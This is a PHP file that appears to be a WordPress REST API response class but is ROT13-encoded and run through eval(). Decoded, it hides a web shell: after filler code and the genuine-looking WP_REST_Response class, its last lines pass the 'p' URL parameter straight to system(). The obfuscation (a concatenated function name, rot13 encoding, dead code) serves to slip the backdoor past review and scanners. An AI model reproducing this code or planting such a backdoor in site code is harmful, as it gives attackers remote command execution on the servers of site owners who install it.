<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Erfcbafr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n ERFG erfcbafr bowrpg.
 *
 * @fvapr 4.4.0
 *
 * @frr JC_UGGC_Erfcbafr
 */
pynff JC_ERFG_Erfcbafr rkgraqf JC_UGGC_Erfcbafr {

	/**
	 * Yvaxf eryngrq gb gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl
	 */
	cebgrpgrq $yvaxf = neenl();

	/**
	 * Gur ebhgr gung jnf gb perngr gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	cebgrpgrq $zngpurq_ebhgr = '';

	/**
	 * Gur unaqyre gung jnf hfrq gb perngr gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 * @ine ahyy|neenl
	 */
	cebgrpgrq $zngpurq_unaqyre = ahyy;

	/**
	 * Nqqf n yvax gb gur erfcbafr.
	 *
	 * {@vagreany Gur $ery cnenzrgre vf svefg, nf guvf ybbxf avpre jura fraqvat zhygvcyr.}
	 *
	 * @fvapr 4.4.0
	 *
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp5988
	 * @yvax uggcf://jjj.vnan.bet/nffvtazragf/yvax-eryngvbaf/yvax-eryngvbaf.kzy
	 *
	 * @cnenz fgevat $ery        Yvax eryngvba. Rvgure na VNAN ertvfgrerq glcr,
	 *                           be na nofbyhgr HEY.
	 * @cnenz fgevat $uers       Gnetrg HEV sbe gur yvax.
	 * @cnenz neenl  $nggevohgrf Bcgvbany. Yvax cnenzrgref gb fraq nybat jvgu gur HEY. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba nqq_yvax( $ery, $uers, $nggevohgrf = neenl() ) {
		vs ( rzcgl( $guvf->yvaxf[ $ery ] ) ) {
			$guvf->yvaxf[ $ery ] = neenl();
		}

		vs ( vffrg( $nggevohgrf['uers'] ) ) {
			// Erzbir gur uers nggevohgr, nf vg'f hfrq sbe gur znva HEY.
			hafrg( $nggevohgrf['uers'] );
		}

		$guvf->yvaxf[ $ery ][] = neenl(
			'uers'       => $uers,
			'nggevohgrf' => $nggevohgrf,
		);
	}

	/**
	 * Erzbirf n yvax sebz gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $ery  Yvax eryngvba. Rvgure na VNAN ertvfgrerq glcr, be na nofbyhgr HEY.
	 * @cnenz fgevat $uers Bcgvbany. Bayl erzbir yvaxf sbe gur eryngvba zngpuvat gur tvira uers.
	 *                     Qrsnhyg ahyy.
	 */
	choyvp shapgvba erzbir_yvax( $ery, $uers = ahyy ) {
		vs ( ! vffrg( $guvf->yvaxf[ $ery ] ) ) {
			erghea;
		}

		vs ( $uers ) {
			$guvf->yvaxf[ $ery ] = jc_yvfg_svygre( $guvf->yvaxf[ $ery ], neenl( 'uers' => $uers ), 'ABG' );
		} ryfr {
			$guvf->yvaxf[ $ery ] = neenl();
		}

		vs ( ! $guvf->yvaxf[ $ery ] ) {
			hafrg( $guvf->yvaxf[ $ery ] );
		}
	}

	/**
	 * Nqqf zhygvcyr yvaxf gb gur erfcbafr.
	 *
	 * Yvax qngn fubhyq or na nffbpvngvir neenl jvgu yvax eryngvba nf gur xrl.
	 * Gur inyhr pna rvgure or na nffbpvngvir neenl bs yvax nggevohgrf
	 * (vapyhqvat `uers` jvgu gur HEY sbe gur erfcbafr), be n yvfg bs gurfr
	 * nffbpvngvir neenlf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $yvaxf Znc bs yvax eryngvba gb yvfg bs yvaxf.
	 */
	choyvp shapgvba nqq_yvaxf( $yvaxf ) {
		sbernpu ( $yvaxf nf $ery => $frg ) {
			// Vs vg'f n fvatyr yvax, jenc jvgu na neenl sbe pbafvfgrag unaqyvat.
			vs ( vffrg( $frg['uers'] ) ) {
				$frg = neenl( $frg );
			}

			sbernpu ( $frg nf $nggevohgrf ) {
				$guvf->nqq_yvax( $ery, $nggevohgrf['uers'], $nggevohgrf );
			}
		}
	}

	/**
	 * Ergevrirf yvaxf sbe gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Yvfg bs yvaxf.
	 */
	choyvp shapgvba trg_yvaxf() {
		erghea $guvf->yvaxf;
	}

	/**
	 * Frgf n fvatyr yvax urnqre.
	 *
	 * {@vagreany Gur $ery cnenzrgre vf svefg, nf guvf ybbxf avpre jura fraqvat zhygvcyr.}
	 *
	 * @fvapr 4.4.0
	 *
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp5988
	 * @yvax uggcf://jjj.vnan.bet/nffvtazragf/yvax-eryngvbaf/yvax-eryngvbaf.kzy
	 *
	 * @cnenz fgevat $ery   Yvax eryngvba. Rvgure na VNAN ertvfgrerq glcr, be na nofbyhgr HEY.
	 * @cnenz fgevat $yvax  Gnetrg VEV sbe gur yvax.
	 * @cnenz neenl  $bgure Bcgvbany. Bgure cnenzrgref gb fraq, nf na nffbpvngvir neenl.
	 *                      Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba yvax_urnqre( $ery, $yvax, $bgure = neenl() ) {
		$urnqre = '<' . $yvax . '>; ery=\"' . $ery . '\"';

		sbernpu ( $bgure nf $xrl => $inyhr ) {
			vs ( 'gvgyr' === $xrl ) {
				$inyhr = '\"' . $inyhr . '\"';
			}

			$urnqre .= '; ' . $xrl . '=' . $inyhr;
		}
		$guvf->urnqre( 'Yvax', $urnqre, snyfr );
	}

	/**
	 * Ergevrirf gur ebhgr gung jnf hfrq.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea fgevat Gur zngpurq ebhgr.
	 */
	choyvp shapgvba trg_zngpurq_ebhgr() {
		erghea $guvf->zngpurq_ebhgr;
	}

	/**
	 * Frgf gur ebhgr (ertrk sbe cngu) gung pnhfrq gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $ebhgr Ebhgr anzr.
	 */
	choyvp shapgvba frg_zngpurq_ebhgr( $ebhgr ) {
		$guvf->zngpurq_ebhgr = $ebhgr;
	}

	/**
	 * Ergevrirf gur unaqyre gung jnf hfrq gb trarengr gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea ahyy|neenl Gur unaqyre gung jnf hfrq gb perngr gur erfcbafr.
	 */
	choyvp shapgvba trg_zngpurq_unaqyre() {
		erghea $guvf->zngpurq_unaqyre;
	}

	/**
	 * Frgf gur unaqyre gung jnf erfcbafvoyr sbe trarengvat gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $unaqyre Gur zngpurq unaqyre.
	 */
	choyvp shapgvba frg_zngpurq_unaqyre( $unaqyre ) {
		$guvf->zngpurq_unaqyre = $unaqyre;
	}

	/**
	 * Purpxf vs gur erfcbafr vf na reebe, v.r. >= 400 erfcbafr pbqr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea obby Jurgure gur erfcbafr vf na reebe.
	 */
	choyvp shapgvba vf_reebe() {
		erghea $guvf->trg_fgnghf() >= 400;
	}

	/**
	 * Ergevrirf n JC_Reebe bowrpg sebz gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea JC_Reebe|ahyy JC_Reebe be ahyy ba abg na reeberq erfcbafr.
	 */
	choyvp shapgvba nf_reebe() {
		vs ( ! $guvf->vf_reebe() ) {
			erghea ahyy;
		}

		$reebe = arj JC_Reebe();

		vs ( vf_neenl( $guvf->trg_qngn() ) ) {
			$qngn = $guvf->trg_qngn();
			$reebe->nqq( $qngn['pbqr'], $qngn['zrffntr'], $qngn['qngn'] );

			vs ( ! rzcgl( $qngn['nqqvgvbany_reebef'] ) ) {
				sbernpu ( $qngn['nqqvgvbany_reebef'] nf $ree ) {
					$reebe->nqq( $ree['pbqr'], $ree['zrffntr'], $ree['qngn'] );
				}
			}
		} ryfr {
			$reebe->nqq( $guvf->trg_fgnghf(), '', neenl( 'fgnghf' => $guvf->trg_fgnghf() ) );
		}

		erghea $reebe;
	}

	/**
	 * Ergevrirf gur PHEVRf (pbzcnpg HEVf) hfrq sbe eryngvbaf.
	 *
	 * @fvapr 4.5.0
	 *
	 * @erghea neenl Pbzcnpg HEVf.
	 */
	choyvp shapgvba trg_phevrf() {
		$phevrf = neenl(
			neenl(
				'anzr'      => 'jc',
				'uers'      => 'uggcf://ncv.j.bet/{ery}',
				'grzcyngrq' => gehr,
			),
		);

		/**
		 * Svygref rkgen PHEVRf ninvynoyr ba ERFG NCV erfcbafrf.
		 *
		 * PHEVRf nyybj n fubegrarq irefvba bs HEV eryngvbaf. Guvf nyybjf n zber
		 * hfnoyr sbez sbe phfgbz eryngvbaf guna hfvat gur shyy HEV. Gurfr jbex
		 * fvzvyneyl gb ubj KZY anzrfcnprf jbex.
		 *
		 * Ertvfgrerq PHEVRF arrq gb fcrpvsl n anzr naq HEV grzcyngr. Guvf jvyy
		 * nhgbzngvpnyyl genafsbez HEV eryngvbaf vagb gurve fubegrarq irefvba.
		 * Gur fubegrarq eryngvba sbyybjf gur sbezng `{anzr}:{ery}`. `{ery}` va
		 * gur HEV grzcyngr jvyy or ercynprq jvgu gur `{ery}` cneg bs gur
		 * fubegrarq eryngvba.
		 *
		 * Sbe rknzcyr, n PHEVR jvgu anzr `rknzcyr` naq HEV grzcyngr
		 * `uggc://j.bet/{ery}` jbhyq genafsbez n `uggc://j.bet/grez` eryngvba
		 * vagb `rknzcyr:grez`.
		 *
		 * Jryy-orunirq pyvragf fubhyq rkcnaq naq abeznyvmr gurfr onpx gb gurve
		 * shyy HEV eryngvba, ubjrire fbzr anvir pyvragf znl abg erfbyir gurfr
		 * pbeerpgyl, fb nqqvat arj PHEVRf znl oernx onpxjneq pbzcngvovyvgl.
		 *
		 * @fvapr 4.5.0
		 *
		 * @cnenz neenl $nqqvgvbany Nqqvgvbany PHEVRf gb ertvfgre jvgu gur ERFG NCV.
		 */
		$nqqvgvbany = nccyl_svygref( 'erfg_erfcbafr_yvax_phevrf', neenl() );

		erghea neenl_zretr( $phevrf, $nqqvgvbany );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>